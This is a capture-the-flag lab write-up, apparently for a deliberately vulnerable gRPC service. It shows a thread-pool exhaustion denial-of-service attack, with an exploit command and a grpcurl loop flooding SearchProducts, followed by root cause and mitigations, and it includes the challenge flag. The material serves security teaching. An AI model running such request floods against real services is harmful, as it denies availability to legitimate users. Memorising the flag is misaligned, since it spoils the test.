# Challenge 12 — Streaming DoS / Resource Exhaustion

| Difficulty | Category              | Service         |
|:----------:|-----------------------|-----------------|
| 🟡  Medium | Availability          | any             |

**Flag:** `FLAG{unb0und3d_str34m_3xh4usts_th3_s3rv3r}`

---

## Real-world motivation

Denial of service is the forgotten cousin of gRPC security. Because
HTTP/2 streams are long-lived, a single misbehaving client can hog an
entire worker thread — or the entire process — with nothing more exotic
than a `for i in range(10_000_000):`.

- **Cloudflare blog (2023)**: *HTTP/2 Rapid Reset attack* (CVE-2023-44487) —
  attackers opened and immediately reset streams to exhaust server
  scheduling.
- **gRPC-Go CVE-2023-32732** — unbounded max_concurrent_streams.
- **Netflix tech-blog (2019)** — a single client sending a 50MB request
  crashed an auth micro-service because the server had no size cap.

---

## Objective

Demonstrate how easy it is to saturate DVGRPC's thread pool using only
unary calls on the **ProductService.SearchProducts** endpoint.  Once the
server is visibly slow, collect the flag.

> The server's thread pool is set to `max_workers=10` — the attack
> succeeds with ~50 concurrent calls.

---

## Why it works

The server is deliberately configured as follows:

```python
server = grpc.server(
    futures.ThreadPoolExecutor(max_workers=10),
    interceptors=[interceptor],
)
```

There are **no** per-client limits, **no** `max_concurrent_streams`
option set, and the `ProductService.SearchProducts` query does a full
SQLite table scan — so each call blocks a worker thread for milliseconds
to seconds.

A bigger payload or a UNION-SELECT-style query amplifies the effect.

---

## Exploit

```bash
python client/exploits/exploit_12_streaming_dos.py --concurrency 50 --duration 10
```

Manual version using `grpcurl` in a bash loop:

```bash
for i in $(seq 1 100); do
  grpcurl -plaintext -d '{"query":"%"}' \
    localhost:50051 dvgrpc.ProductService/SearchProducts &
done
wait
```

While the attack runs, legitimate callers see `DEADLINE_EXCEEDED` — proof
of the DoS.

---

## Root cause

- Fixed-size thread pool (`max_workers=10`) with no queue limit.
- No per-client rate limiting.
- No `max_concurrent_streams` set on the server.
- Underlying DB query does an un-indexed LIKE scan, amplifying the cost.

---

## Mitigation (production)

1. **Cap concurrent streams per connection**:

   ```python
   server = grpc.server(
       futures.ThreadPoolExecutor(max_workers=32),
       options=[
           ("grpc.max_concurrent_streams", 100),
           ("grpc.max_connection_age_ms", 5 * 60 * 1000),
           ("grpc.http2.max_pings_without_data", 2),
       ],
   )
   ```

2. **Use an async server** (`grpc.aio.server`) so one slow RPC doesn't
   pin a worker thread.
3. **Token-bucket / leaky-bucket rate limit** per authenticated user and
   per source IP (an interceptor can wrap `envoy ratelimit` or `redis`).
4. **Enforce request deadlines** on the client and reject incoming RPCs
   whose remaining deadline is absurdly long (`context.time_remaining()`).
5. **Shed load** before the process falls over — Envoy / Istio circuit
   breakers, or a simple semaphore around expensive handlers.
6. **Size-limit payloads**:

   ```python
   ("grpc.max_receive_message_length", 1 * 1024 * 1024)
   ```

---

## References

- gRPC security exposure surface — [grpc.io docs](https://grpc.io/docs/guides/performance/)
- CVE-2023-44487 — HTTP/2 Rapid Reset
- [Cloudflare write-up on HTTP/2 Rapid Reset](https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/)
- OWASP API Security Top 10 — API4:2023 *Unrestricted Resource Consumption*
